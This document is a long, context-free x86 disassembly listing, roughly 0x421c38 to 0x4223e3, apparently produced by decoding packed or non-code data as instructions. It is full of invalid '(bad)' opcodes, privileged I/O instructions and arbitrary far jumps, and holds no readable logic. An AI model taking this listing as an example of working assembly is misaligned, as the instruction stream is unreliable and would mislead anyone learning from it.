  421c38:	mov    ch,0x35
  421c3a:	inc    eax
  421c3b:	jno    0x421c86
  421c3d:	(bad)  
  421c3e:	out    0x61,eax
  421c40:	retf   
  421c41:	scas   al,BYTE PTR es:[edi]
  421c42:	adc    DWORD PTR [esi-0x31],0xeef69339
  421c49:	fmul   st(7),st
  421c4b:	cmp    ebx,DWORD PTR [esi]
  421c4d:	stos   DWORD PTR es:[edi],eax
  421c4e:	pop    ecx
  421c4f:	add    eax,0xb37e5ac0
  421c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c55:	xlat   BYTE PTR ds:[ebx]
  421c56:	push   ebp
  421c57:	lock lods eax,DWORD PTR ds:[esi]
  421c59:	jb     0x421c47
  421c5b:	(bad)  
  421c5c:	out    0x4b,eax
  421c5e:	inc    edi
  421c5f:	pop    ecx
  421c60:	nop
  421c61:	pop    edi
  421c62:	sub    eax,0x32babcb
  421c67:	dec    ebp
  421c68:	inc    DWORD PTR [edx-0x27999284]
  421c6e:	pop    esp
  421c6f:	sbb    eax,0x1f43b7a9
  421c74:	xor    edx,0x4a
  421c77:	xchg   edi,eax
  421c78:	xchg   ebp,eax
  421c79:	loopne 0x421c5d
  421c7b:	aad    0x0
  421c7d:	xchg   esp,eax
  421c7e:	shl    DWORD PTR [ebx+0x64],0xf2
  421c82:	mov    dh,0xc3
  421c84:	fldcw  WORD PTR [edi+0x77]
  421c87:	test   DWORD PTR [esi],edx
  421c89:	xor    eax,0x10fa5f70
  421c8e:	addr16 sbb cl,dh
  421c91:	jmp    0x6687:0x27a698bc
  421c98:	sbb    al,0xfb
  421c9a:	jo     0x421cdb
  421c9c:	mov    eax,0xb48def3d
  421ca1:	outs   dx,DWORD PTR ds:[esi]
  421ca2:	test   al,0x9d
  421ca4:	cmp    DWORD PTR [edi+0x76],esp
  421ca7:	jo     0x421c8a
  421ca9:	add    eax,0x8f9d2278
  421cae:	repnz lods eax,DWORD PTR ds:[esi]
  421cb0:	inc    edx
  421cb1:	cld    
  421cb2:	add    ebx,DWORD PTR [esi]
  421cb4:	rol    BYTE PTR [edx-0x4c],0x46
  421cb8:	mov    edi,0x7244ed2d
  421cbd:	scas   al,BYTE PTR es:[edi]
  421cbe:	gs (bad) 
  421cc0:	or     al,0xa2
  421cc2:	sub    al,0xc1
  421cc4:	cmp    edx,DWORD PTR [ebp-0x67e9dfea]
  421cca:	pop    ss
  421ccb:	pop    ebp
  421ccc:	pop    ss
  421ccd:	mov    bh,0xbb
  421ccf:	aam    0x9b
  421cd1:	xor    BYTE PTR [edx+0x852e29a],ah
  421cd7:	push   ebx
  421cd8:	xchg   esi,eax
  421cd9:	pop    esp
  421cda:	frstor [ebp+0x7af0d439]
  421ce0:	inc    edx
  421ce1:	sub    BYTE PTR [edx+0x491cfc8d],cl
  421ce7:	cmc    
  421ce8:	sbb    al,BYTE PTR [esi+0x44f0fcd4]
  421cee:	sbb    cl,BYTE PTR [ebx]
  421cf0:	jns    0x421c8c
  421cf2:	test   BYTE PTR [edx],ah
  421cf4:	lds    ebp,FWORD PTR [ebx+edi*4-0x67]
  421cf8:	addr16 jmp 0x421d5b
  421cfb:	icebp  
  421cfc:	popf   
  421cfd:	xchg   edi,eax
  421cfe:	aas    
  421cff:	hlt    
  421d00:	adc    BYTE PTR [edi-0x4132f69],cl
  421d06:	outs   dx,DWORD PTR ds:[esi]
  421d07:	xchg   ecx,eax
  421d08:	stos   BYTE PTR es:[edi],al
  421d09:	cmp    eax,0x7b8fed24
  421d0e:	mov    bh,0x89
  421d10:	pop    esi
  421d11:	cdq    
  421d12:	mov    esi,0x59f93617
  421d17:	pop    edx
  421d18:	sub    dh,BYTE PTR [ebx+0x16]
  421d1b:	jb     0x421cdf
  421d1d:	xchg   ebx,eax
  421d1e:	xchg   ebx,eax
  421d1f:	stos   BYTE PTR es:[edi],al
  421d20:	push   eax
  421d21:	js     0x421d7b
  421d23:	out    0x97,al
  421d25:	jbe    0x421d2b
  421d27:	sub    BYTE PTR ss:[ebx+0x14],al
  421d2b:	lds    ebx,FWORD PTR [ecx+0x53bc82ed]
  421d31:	iret   
  421d32:	mov    ds:0xd6a164c6,al
  421d37:	pop    ebp
  421d38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d39:	test   al,0x3e
  421d3b:	fbld   TBYTE PTR [esi-0x73]
  421d3e:	push   edi
  421d3f:	mov    ah,0xfc
  421d41:	test   dh,bh
  421d43:	mov    esi,0xe6de40c2
  421d48:	inc    ecx
  421d49:	stos   BYTE PTR es:[edi],al
  421d4a:	jle    0x421cd6
  421d4c:	lea    eax,[edx+0x74]
  421d4f:	add    al,0x24
  421d51:	das    
  421d52:	and    ch,BYTE PTR [esi+0x46]
  421d55:	cli    
  421d56:	xchg   BYTE PTR [edx+edi*4],dl
  421d59:	mov    bl,BYTE PTR [edi-0x3bcdaef7]
  421d5f:	shl    DWORD PTR [ebp+0x6c],0x64
  421d63:	inc    esi
  421d64:	nop
  421d65:	or     DWORD PTR [ecx+0x6b6c7d33],ebp
  421d6b:	ds call 0xb10a:0x33c7bdff
  421d73:	mov    ss,WORD PTR [esi+eax*8+0x3c]
  421d77:	lock inc edi
  421d79:	ds repz pushf 
  421d7c:	int3   
  421d7d:	sbb    dh,BYTE PTR [ebp+ebx*2+0x686ea4f]
  421d84:	daa    
  421d85:	enter  0xc7c8,0x9c
  421d89:	cs imul esi,ecx,0x11
  421d8d:	push   ecx
  421d8e:	cmp    al,0x3c
  421d90:	pop    edx
  421d91:	and    BYTE PTR [ebp-0x62bb6283],ch
  421d97:	(bad)  
  421d99:	imul   ebp,DWORD PTR [edx+0x6a1b2eef],0x4feb0624
  421da3:	jns    0x421d29
  421da5:	inc    ebx
  421da6:	stos   DWORD PTR es:[edi],eax
  421da7:	adc    BYTE PTR [eax+ebp*8+0x20],0x64
  421dac:	adc    BYTE PTR [esi-0x55],bl
  421daf:	mov    eax,ds:0x8ecd5d82
  421db4:	jae    0x421e2a
  421db6:	jae    0x421e04
  421db8:	popf   
  421db9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dba:	test   ah,cl
  421dbc:	cs inc ebp
  421dbe:	sahf   
  421dbf:	mov    BYTE PTR [edx+0xe],ah
  421dc2:	pop    ebp
  421dc3:	push   es
  421dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dc5:	xchg   DWORD PTR [ebx+0x5ce40c40],edi
  421dcb:	sub    DWORD PTR [eax-0x24],edx
  421dce:	scas   eax,DWORD PTR es:[edi]
  421dcf:	adc    ch,ch
  421dd1:	or     bl,bl
  421dd3:	ret    0xf55
  421dd6:	pop    esp
  421dd7:	pop    esp
  421dd8:	lods   al,BYTE PTR ds:[esi]
  421dd9:	and    cl,BYTE PTR [ecx-0x56ee5a12]
  421ddf:	cld    
  421de0:	inc    edx
  421de1:	jg     0x421e52
  421de3:	jge    0x421dbf
  421de5:	retf   0xf6d
  421de8:	adc    ebp,DWORD PTR [edx-0x24df8fac]
  421dee:	dec    ebp
  421def:	jge    0x421e0b
  421df1:	xor    bh,BYTE PTR [eax-0x71a1878d]
  421df7:	mov    ch,0x7c
  421df9:	fidivr DWORD PTR [ebx+eiz*4+0x2faf0399]
  421e00:	loope  0x421dee
  421e02:	unpckhps xmm5,XMMWORD PTR [edi]
  421e05:	jbe    0x421db9
  421e07:	jg     0x421e74
  421e09:	ror    al,cl
  421e0b:	mov    bl,0x88
  421e0d:	xchg   ebx,eax
  421e0e:	pusha  
  421e0f:	imul   DWORD PTR [ebx]
  421e11:	jne    0x421dd8
  421e13:	inc    ebx
  421e14:	in     eax,0x78
  421e16:	iret   
  421e17:	mov    ebx,0x8fef04
  421e1c:	and    ah,bl
  421e1e:	mov    esp,eax
  421e20:	pop    esp
  421e21:	addr16 dec esp
  421e23:	adc    al,0x12
  421e25:	out    0xb7,al
  421e27:	cld    
  421e28:	outs   dx,DWORD PTR ds:[esi]
  421e29:	out    0xcb,eax
  421e2b:	add    edi,ecx
  421e2d:	jmp    0x42233f
  421e32:	les    edi,FWORD PTR [esi]
  421e34:	(bad)  
  421e35:	xlat   BYTE PTR ds:[ebx]
  421e36:	retf   0xd9d7
  421e39:	ror    DWORD PTR [eax+ebx*2+0xf],1
  421e3d:	xchg   esi,eax
  421e3e:	fcos   
  421e40:	mov    edx,esp
  421e42:	fs jno 0x421ec4
  421e45:	js     0x421eba
  421e47:	jl     0x421ec1
  421e49:	js     0x421e3b
  421e4b:	aad    0x4e
  421e4d:	fisttp DWORD PTR [edi]
  421e4f:	and    bh,BYTE PTR [eax]
  421e51:	cmp    dl,ch
  421e53:	mov    ds:0x22a32fe,eax
  421e58:	aad    0x50
  421e5a:	out    0x1c,eax
  421e5c:	lods   eax,DWORD PTR ds:[esi]
  421e5d:	jns    0x421e48
  421e5f:	fisubr WORD PTR [esi+0x6f3921b3]
  421e65:	xchg   edi,eax
  421e66:	dec    esp
  421e67:	ja     0x421e9f
  421e69:	pop    ebp
  421e6a:	sbb    eax,0x95076623
  421e6f:	loopne 0x421ea0
  421e71:	fcom   QWORD PTR [ebp-0x5276cb27]
  421e77:	cmp    ah,BYTE PTR ds:0x62332faa
  421e7d:	push   esp
  421e7e:	hlt    
  421e7f:	sub    ecx,DWORD PTR [edi+ecx*1-0x6e]
  421e83:	inc    edx
  421e84:	push   edi
  421e85:	mov    cl,0xaf
  421e87:	xchg   ebx,eax
  421e88:	adc    ah,cl
  421e8a:	and    eax,ecx
  421e8c:	and    al,BYTE PTR [ebp-0xa037557]
  421e92:	jo     0x421e7f
  421e94:	lods   eax,DWORD PTR ds:[esi]
  421e95:	mov    cl,0xa
  421e97:	or     al,0x22
  421e99:	fdivr  QWORD PTR [esi+0x3416160c]
  421e9f:	in     eax,dx
  421ea0:	dec    edi
  421ea1:	cdq    
  421ea2:	push   0xffffffb0
  421ea4:	dec    ebx
  421ea5:	cmp    ecx,DWORD PTR [esi-0x2f]
  421ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ea9:	push   edx
  421eaa:	mov    ds:0xf4752fb,eax
  421eaf:	add    eax,0x75f80cb8
  421eb4:	pop    eax
  421eb5:	add    al,0x6
  421eb7:	xchg   ecx,eax
  421eb8:	dec    ecx
  421eb9:	test   BYTE PTR [eax+0x21d9743f],ah
  421ebf:	xor    esp,DWORD PTR [ecx+0x17fdba77]
  421ec5:	lock fidivr WORD PTR [esi-0xe6e6d82]
  421ecc:	retf   0x85fa
  421ecf:	out    dx,al
  421ed0:	into   
  421ed1:	(bad)  
  421ed2:	xchg   edx,eax
  421ed3:	das    
  421ed4:	or     eax,0xa4fb108f
  421ed9:	and    edx,ecx
  421edb:	mov    cl,0x6b
  421edd:	add    ebx,edx
  421edf:	cwde   
  421ee0:	adc    DWORD PTR [edi],ebp
  421ee2:	mov    cl,0xc
  421ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ee5:	std    
  421ee6:	xor    al,0x5b
  421ee8:	nop
  421ee9:	jae    0x421eae
  421eeb:	adc    BYTE PTR [ebp-0x44d337aa],dl
  421ef1:	or     BYTE PTR [esi+esi*2],ch
  421ef4:	lods   al,BYTE PTR ds:[esi]
  421ef5:	inc    ebp
  421ef6:	inc    ebx
  421ef7:	les    ecx,FWORD PTR [edx]
  421ef9:	stos   DWORD PTR es:[edi],eax
  421efa:	jle    0x421f2f
  421efc:	(bad)  
  421efd:	rol    ebx,1
  421eff:	push   edx
  421f00:	ss (bad) 
  421f02:	loop   0x421ef0
  421f04:	(bad)  
  421f05:	cli    
  421f06:	(bad)  
  421f07:	retf   
  421f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f09:	xor    BYTE PTR [ebp-0x4bfe6057],ah
  421f0f:	cdq    
  421f10:	stos   DWORD PTR es:[edi],eax
  421f11:	stc    
  421f12:	dec    edx
  421f13:	xchg   esi,eax
  421f14:	std    
  421f15:	je     0x421f6e
  421f17:	mov    esi,0x38fa1df0
  421f1c:	mov    esp,0x5b63f69a
  421f21:	and    BYTE PTR ds:0xe6e7e712,0xf6
  421f28:	retf   0xeabe
  421f2b:	addr16 in al,0x95
  421f2e:	cwde   
  421f2f:	push   edi
  421f30:	lock addr16 and eax,0xc2e47943
  421f37:	outs   dx,BYTE PTR ds:[esi]
  421f38:	pop    edi
  421f39:	inc    esi
  421f3a:	xchg   DWORD PTR [ebx-0x7d2e682e],eax
  421f40:	or     DWORD PTR [edi],0x8928c3c
  421f46:	dec    ebx
  421f47:	jl     0x421f4e
  421f49:	(bad)  
  421f4b:	cmp    eax,0x288063f7
  421f50:	fnstsw WORD PTR [edi+eax*4]
  421f53:	or     ecx,DWORD PTR [edi-0x7a]
  421f56:	push   ss
  421f57:	mov    DWORD PTR [ebp-0x7af95dc8],ecx
  421f5d:	in     eax,dx
  421f5e:	push   es
  421f5f:	mov    ?,WORD PTR [eax-0x5]
  421f62:	into   
  421f63:	lods   al,BYTE PTR ds:[esi]
  421f64:	test   eax,0xc490abd8
  421f69:	inc    esp
  421f6a:	push   edi
  421f6b:	test   DWORD PTR [edi-0x1e],esp
  421f6e:	mov    BYTE PTR [ebp-0x32ab2d84],ah
  421f74:	mov    ebp,0x9ec9fa8d
  421f79:	pop    esp
  421f7a:	cwde   
  421f7b:	imul   esi,esi,0xffffffa5
  421f7e:	test   dl,ah
  421f80:	fnstcw WORD PTR [ebx-0x38]
  421f83:	add    dl,BYTE PTR [esi-0x1a]
  421f86:	stc    
  421f87:	or     esi,DWORD PTR [ebx]
  421f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f8a:	icebp  
  421f8b:	data16 ja 0x421f46
  421f8e:	test   BYTE PTR [ebp-0x40],ch
  421f91:	cs pushf 
  421f93:	test   BYTE PTR [ebx],dh
  421f95:	arpl   cx,bp
  421f97:	int    0xd6
  421f99:	sbb    esp,esp
  421f9b:	ret    0x5b5a
  421f9e:	(bad)  
  421f9f:	jp     0x421f72
  421fa1:	sub    al,0x4c
  421fa3:	adc    al,0x2e
  421fa5:	or     BYTE PTR [eax+ecx*1-0x45],cl
  421fa9:	mov    cl,0x4c
  421fab:	mov    esi,DWORD PTR [edx-0x37cefeba]
  421fb1:	inc    ebp
  421fb2:	add    eax,0x5ec4d605
  421fb7:	inc    ebx
  421fb8:	stos   DWORD PTR es:[edi],eax
  421fb9:	xlat   BYTE PTR ds:[ebx]
  421fba:	lea    edi,[eax-0xe]
  421fbd:	xchg   edx,eax
  421fbe:	pop    es
  421fbf:	add    al,0xc1
  421fc1:	lods   eax,DWORD PTR ds:[esi]
  421fc2:	psubw  mm6,mm3
  421fc5:	sub    BYTE PTR [eax-0x6a],al
  421fc8:	pop    ds
  421fc9:	icebp  
  421fca:	jl     0x421fcc
  421fcc:	dec    edi
  421fcd:	cmp    BYTE PTR ds:0xf0d1971d,0xbd
  421fd4:	sub    esi,ecx
  421fd6:	push   0xffffffeb
  421fd8:	cmp    ebp,DWORD PTR [ebp-0x35]
  421fdb:	sbb    cl,BYTE PTR [ecx-0x1036f35]
  421fe1:	sub    eax,0xd259973a
  421fe6:	int3   
  421fe7:	test   al,0x75
  421fe9:	jmp    0xf44c:0x233d1653
  421ff0:	fsub   DWORD PTR [ecx-0x2b4c5fd3]
  421ff6:	inc    esi
  421ff7:	and    ebx,DWORD PTR [esi]
  421ff9:	xchg   ebp,eax
  421ffa:	fldenv [edi]
  421ffc:	(bad)  
  421ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ffe:	or     edi,DWORD PTR [esi+ebp*2]
  422001:	les    ebx,FWORD PTR [edx+0x42c22625]
  422007:	or     dh,dh
  422009:	test   al,0xa9
  42200b:	test   al,0xf3
  42200d:	test   BYTE PTR [ebx],bh
  42200f:	or     esp,DWORD PTR ds:0xae7bc5d5
  422015:	fwait
  422016:	mov    al,bh
  422018:	xchg   ebx,eax
  422019:	and    eax,0x84d49690
  42201e:	inc    esi
  42201f:	lds    edx,FWORD PTR [edi+ebp*8-0x7875189b]
  422026:	mov    ds:0x42202b7e,al
  42202b:	push   0x23536076
  422030:	jnp    0x42205f
  422032:	scas   eax,DWORD PTR es:[edi]
  422033:	push   ds
  422034:	mov    edx,0x65603be5
  422039:	and    eax,0xe7c782a
  42203e:	sub    esp,edi
  422040:	jmp    DWORD PTR ds:0x30925777
  422046:	add    al,0x84
  422048:	jbe    0x42209c
  42204a:	push   eax
  42204b:	xchg   ebx,eax
  42204c:	ja     0x4220c4
  42204e:	mov    BYTE PTR [edx],ah
  422050:	fst    DWORD PTR [ebx+0x56adc64e]
  422056:	cmp    DWORD PTR [esi+0x51a7f6c7],0x2bd76915
  422060:	cli    
  422061:	aaa    
  422062:	pop    edx
  422063:	jmp    0x1c8:0x3c287d46
  42206a:	push   edx
  42206b:	mov    ecx,0x47a47caf
  422071:	xchg   edi,eax
  422072:	mov    bl,0x30
  422074:	test   DWORD PTR [eax-0x7f045ad0],edi
  42207a:	mov    ch,0xa2
  42207c:	(bad)  
  42207d:	cmp    edi,DWORD PTR [ecx-0x4f]
  422080:	aaa    
  422081:	xor    eax,0x7ed532c0
  422086:	mov    ch,0x6a
  422088:	and    DWORD PTR [edx+0x7c],eax
  42208b:	inc    esp
  42208c:	aas    
  42208d:	repz dec ecx
  42208f:	jo     0x42209e
  422091:	pop    edx
  422092:	adc    eax,0x1fff7d62
  422097:	inc    edi
  422098:	xchg   edi,eax
  422099:	test   BYTE PTR [ecx+0x75a83f5a],bh
  42209f:	xchg   edx,eax
  4220a0:	ss das 
  4220a2:	cmp    BYTE PTR [edx],bl
  4220a4:	lock cli 
  4220a6:	adc    eax,0x647b78e
  4220ab:	repz add dl,BYTE PTR [ebp+0x307c457c]
  4220b2:	xchg   esi,eax
  4220b3:	int3   
  4220b4:	popa   
  4220b5:	call   0x8c27:0x216c6acb
  4220bc:	loope  0x422085
  4220be:	(bad)  
  4220bf:	and    dh,bh
  4220c1:	ret    
  4220c2:	pop    es
  4220c3:	mov    bh,0x84
  4220c5:	jns    0x422069
  4220c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220c8:	sub    eax,0x644b439a
  4220cd:	aam    0x45
  4220cf:	inc    ebx
  4220d0:	mov    ebx,0xb076bf9e
  4220d5:	cmp    eax,0xa31c864
  4220da:	out    dx,al
  4220db:	sbb    al,0x4e
  4220dd:	jmp    FWORD PTR [ecx]
  4220df:	je     0x422124
  4220e1:	cdq    
  4220e2:	fbld   TBYTE PTR [eax]
  4220e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220e5:	rol    DWORD PTR [esi],cl
  4220e7:	inc    ecx
  4220e8:	jg     0x422120
  4220ea:	cli    
  4220eb:	or     ebp,DWORD PTR [ecx+0x11]
  4220ee:	repz cwde 
  4220f0:	cmp    al,BYTE PTR [esi+0x32cc2001]
  4220f6:	xor    bh,bl
  4220f8:	not    BYTE PTR [eax+0x59e92e91]
  4220fe:	sbb    BYTE PTR cs:[ecx+0x6fcbc92],bl
  422105:	jmp    0x6235:0x9876039f
  42210c:	shl    BYTE PTR [esi-0x2b],0x12
  422110:	jnp    0x422183
  422112:	xchg   edx,eax
  422113:	ins    BYTE PTR es:[edi],dx
  422114:	lahf   
  422115:	pop    edx
  422116:	cmp    BYTE PTR [esi+edi*8-0x4e2e0723],ch
  42211d:	je     0x422166
  42211f:	ret    
  422120:	out    0x34,eax
  422122:	dec    eax
  422123:	ss cmp al,0x8b
  422126:	prefetchwt1 (bad)
  422127:	or     eax,0x6b6982d3
  42212c:	std    
  42212d:	sub    eax,0x77bfd3e7
  422132:	test   DWORD PTR [esi-0x2d],0xe596fe6b
  422139:	out    dx,eax
  42213a:	sub    al,0x9f
  42213c:	jbe    0x422116
  42213e:	fidiv  WORD PTR [edi]
  422140:	(bad)  
  422141:	scas   al,BYTE PTR es:[edi]
  422142:	repnz inc esp
  422144:	xlat   BYTE PTR ds:[ebx]
  422145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422146:	jecxz  0x422145
  422148:	push   esi
  422149:	and    BYTE PTR [esi],bl
  42214b:	cmp    bh,ch
  42214d:	fsub   QWORD PTR [edx+0x61]
  422150:	pop    esi
  422151:	xchg   esi,eax
  422152:	aas    
  422153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422154:	inc    ecx
  422155:	fsub   DWORD PTR ss:[edi-0x2561eb55]
  42215c:	mov    eax,0xae716edf
  422161:	mov    cl,0x6b
  422163:	and    eax,0x50beba1f
  422168:	adc    al,BYTE PTR [ebp+0x70]
  42216b:	add    ecx,eax
  42216d:	mov    dh,0x10
  42216f:	out    0x29,eax
  422171:	xchg   edi,eax
  422172:	jno    0x4221d5
  422174:	cdq    
  422175:	mov    cl,BYTE PTR [esi-0x49c6c680]
  42217b:	ds jl  0x4221e0
  42217e:	aad    0xbc
  422180:	cmp    WORD PTR [edi+edi*4-0x17],sp
  422185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422186:	adc    al,0x4b
  422188:	ror    dl,cl
  42218a:	or     eax,DWORD PTR [ebx-0x617d3d7]
  422190:	jb     0x422125
  422192:	push   eax
  422193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422194:	sbb    DWORD PTR [ebx-0x796f2174],0xbd93b2aa
  42219e:	dec    edx
  42219f:	mov    ch,0x43
  4221a1:	jnp    0x4221c2
  4221a3:	ror    BYTE PTR [edi+0x75],1
  4221a6:	sti    
  4221a7:	mov    esi,0x1735f493
  4221ac:	(bad)  [eax-0x6c101a71]
  4221b2:	shr    DWORD PTR [eax],0xcf
  4221b5:	dec    esp
  4221b6:	aam    0xe7
  4221b8:	jns    0x422191
  4221ba:	ins    DWORD PTR es:[edi],dx
  4221bb:	out    0x46,al
  4221bd:	and    dh,0xcb
  4221c0:	shl    edx,cl
  4221c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221c3:	pop    edx
  4221c4:	test   al,0x9d
  4221c6:	push   eax
  4221c7:	and    ecx,0x63
  4221ca:	or     al,0x13
  4221cc:	dec    edi
  4221cd:	sub    al,0xa
  4221cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221d0:	or     eax,0x7f9d3790
  4221d5:	xchg   esp,eax
  4221d6:	mov    ds:0x9771191f,eax
  4221db:	sub    bh,al
  4221dd:	fidivr DWORD PTR [eax+0x9]
  4221e0:	sbb    BYTE PTR [esi],ch
  4221e2:	shr    DWORD PTR [ebp-0x34],cl
  4221e5:	pop    es
  4221e6:	xchg   ecx,eax
  4221e7:	adc    DWORD PTR [edi+eax*8],edi
  4221ea:	aad    0x95
  4221ec:	arpl   si,sp
  4221ee:	sbb    eax,0x82b2935c
  4221f3:	cmp    BYTE PTR [esi],cl
  4221f5:	mov    eax,0xfde7c855
  4221fa:	loop   0x422249
  4221fc:	inc    esp
  4221fd:	mov    al,0xc6
  4221ff:	mov    ah,0x7b
  422201:	add    DWORD PTR [edx+0x37ecf],ebx
  422207:	pusha  
  422208:	add    BYTE PTR [edi],al
  42220a:	mov    bh,0x3f
  42220c:	mov    eax,ds:0x31307788
  422211:	xchg   DWORD PTR [edi-0x7f643cb2],ecx
  422217:	jg     0x4221da
  422219:	stc    
  42221a:	rcr    BYTE PTR [edi+0x2d135be2],cl
  422220:	add    dl,BYTE PTR [eax+0x27]
  422223:	imul   edx,DWORD PTR [edx-0x59],0xffffffe1
  422227:	retf   
  422228:	cmp    DWORD PTR [eax+ebx*8],ebp
  42222b:	jg     0x4221d0
  42222d:	js     0x4221eb
  42222f:	dec    ecx
  422230:	inc    eax
  422231:	std    
  422232:	sbb    BYTE PTR ds:0x8480cdc2,ah
  422238:	es ins BYTE PTR es:[edi],dx
  42223a:	je     0x42227e
  42223c:	mov    esp,?
  42223e:	in     eax,0xa8
  422240:	sub    al,0x10
  422242:	fistp  QWORD PTR [edx+eax*1]
  422245:	jl     0x42224e
  422247:	sbb    al,0xc9
  422249:	cmp    ch,BYTE PTR [eax]
  42224b:	mov    dl,0x79
  42224d:	xor    eax,0x7f56f289
  422252:	xor    BYTE PTR [ecx-0x13cec30f],bh
  422258:	mov    bh,BYTE PTR [esi]
  42225a:	xor    DWORD PTR [ecx-0x31105de6],ebx
  422260:	jmp    0x4222c8
  422262:	test   al,0xf2
  422264:	retf   0x995c
  422267:	shr    bl,cl
  422269:	repnz jecxz 0x422249
  42226c:	mov    ecx,0x562a985e
  422271:	jmp    0x42224c
  422273:	icebp  
  422274:	add    esp,DWORD PTR [ebx]
  422276:	mov    DWORD PTR [eax],ecx
  422278:	dec    esp
  422279:	stos   BYTE PTR es:[edi],al
  42227a:	scas   al,BYTE PTR es:[edi]
  42227b:	inc    ebp
  42227c:	adc    eax,0xaa1df422
  422281:	retf   
  422282:	inc    eax
  422283:	adc    al,0x47
  422285:	push   edi
  422286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422287:	shl    eax,1
  422289:	(bad)  
  42228a:	out    0x40,al
  42228c:	lock loopne 0x422255
  42228f:	mov    edx,0xd456115f
  422294:	int    0x45
  422296:	hlt    
  422297:	xor    DWORD PTR [ebx],eax
  422299:	jae    0x422248
  42229b:	mov    edi,DWORD PTR [ecx]
  42229d:	pop    ebx
  42229e:	ficom  DWORD PTR [edi]
  4222a0:	and    eax,0x3cff4ec3
  4222a5:	ret    0x2bf2
  4222a8:	lds    ebp,FWORD PTR [ebx-0x48b18b6]
  4222ae:	das    
  4222af:	std    
  4222b0:	inc    ebp
  4222b1:	fwait
  4222b2:	cmc    
  4222b3:	xchg   DWORD PTR [esi+0x2a163823],eax
  4222b9:	pop    ds
  4222ba:	inc    edx
  4222bb:	sbb    DWORD PTR [ebx],eax
  4222bd:	adc    eax,0x5ea512fb
  4222c2:	in     eax,dx
  4222c3:	or     al,0x88
  4222c5:	retf   
  4222c6:	inc    ebp
  4222c7:	in     eax,dx
  4222c8:	into   
  4222c9:	popf   
  4222ca:	jge    0x4222b5
  4222cc:	push   ecx
  4222cd:	jmp    0x2f07:0x46174482
  4222d4:	mov    dl,ah
  4222d6:	xor    edx,ecx
  4222d8:	aam    0x4d
  4222da:	pop    ss
  4222db:	(bad)  
  4222dc:	mov    ebp,DWORD PTR [edi]
  4222de:	mov    ah,0x2d
  4222e0:	push   eax
  4222e1:	add    eax,0xba956d6f
  4222e6:	mov    edx,0xf136849
  4222eb:	jne    0x422326
  4222ed:	lock arpl WORD PTR [esi-0x4eb59273],ax
  4222f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222f5:	fs mov bl,0x6a
  4222f8:	sbb    eax,0x34e633a6
  4222fd:	jg     0x4222b0
  4222ff:	fs call 0x8241:0x3288268b
  422307:	addr16 adc eax,0x7b2fdeb3
  42230d:	pop    edx
  42230e:	and    al,0x64
  422310:	pop    eax
  422311:	and    cl,dh
  422313:	dec    eax
  422314:	retf   0x8282
  422317:	mov    ds:0x6a807ddf,eax
  42231c:	mov    eax,0xeb6be52c
  422321:	mov    esi,0x466eea55
  422326:	shr    BYTE PTR [eax-0x721a1d6a],0x29
  42232d:	fcom   QWORD PTR [ecx+edi*4]
  422330:	nop
  422331:	jns    0x4222d2
  422333:	rcl    ch,cl
  422335:	clc    
  422336:	daa    
  422337:	push   esi
  422338:	adc    al,0x4d
  42233a:	dec    esi
  42233b:	inc    edi
  42233c:	js     0x42238c
  42233e:	inc    ebx
  42233f:	add    edx,ecx
  422341:	imul   edx,edi
  422344:	mov    edi,DWORD PTR [ebp-0x8]
  422347:	mov    ebx,DWORD PTR [ebp-0x10]
  42234a:	sub    ebx,edi
  42234c:	cmp    ebx,edx
  42234e:	ja     0x42284c
  422354:	jmp    0x422844
  422359:	ror    edx,1
  42235b:	sar    DWORD PTR [esi],0xd9
  42235e:	vpsubusw xmm1,xmm5,XMMWORD PTR [esi+0x6aee0aae]
  422366:	(bad)  
  422367:	push   edi
  422368:	fcomp  DWORD PTR [edi+0x74]
  42236b:	jg     0x4223e5
  42236d:	dec    ebp
  42236e:	jl     0x4223e8
  422370:	js     0x422375
  422372:	pop    ss
  422373:	(bad)  
  422374:	pop    ds
  422375:	inc    edx
  422376:	out    dx,al
  422377:	dec    esi
  422378:	sub    eax,0x16c53bdb
  42237d:	call   0xf6430fab
  422382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422383:	aam    0xd6
  422385:	or     al,0xad
  422387:	sub    cl,BYTE PTR [ecx+0x253f0b9c]
  42238d:	arpl   WORD PTR [ebp+edi*4+0x2d634612],ax
  422394:	or     eax,DWORD PTR [edx+0x24243c42]
  42239a:	and    DWORD PTR [eax-0x22e0dc9d],ebx
  4223a0:	ja     0x4223af
  4223a2:	jp     0x422400
  4223a4:	fisubr WORD PTR [edx]
  4223a6:	sbb    dh,al
  4223a8:	out    0x87,eax
  4223aa:	inc    ebx
  4223ab:	inc    esp
  4223ac:	mov    edi,0xdc5fe204
  4223b1:	lods   eax,DWORD PTR ds:[esi]
  4223b2:	push   ds
  4223b3:	mov    eax,ds:0xde9aaa45
  4223b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223b9:	sti    
  4223ba:	sub    eax,0x13dc24d9
  4223bf:	add    al,0x1d
  4223c1:	jge    0x422388
  4223c3:	cmp    DWORD PTR [edx],edi
  4223c5:	imul   eax,DWORD PTR ss:[edi+0x7ee2163e],0xffffff8c
  4223cd:	in     eax,dx
  4223ce:	mov    esp,0x166cb595
  4223d3:	mov    eax,ds:0xfb7cb7e9
  4223d8:	xchg   BYTE PTR ds:0x94aa95a3,ah
  4223de:	(bad)
  4223e1:	mov    ch,0x53
  4223e3:	clc    
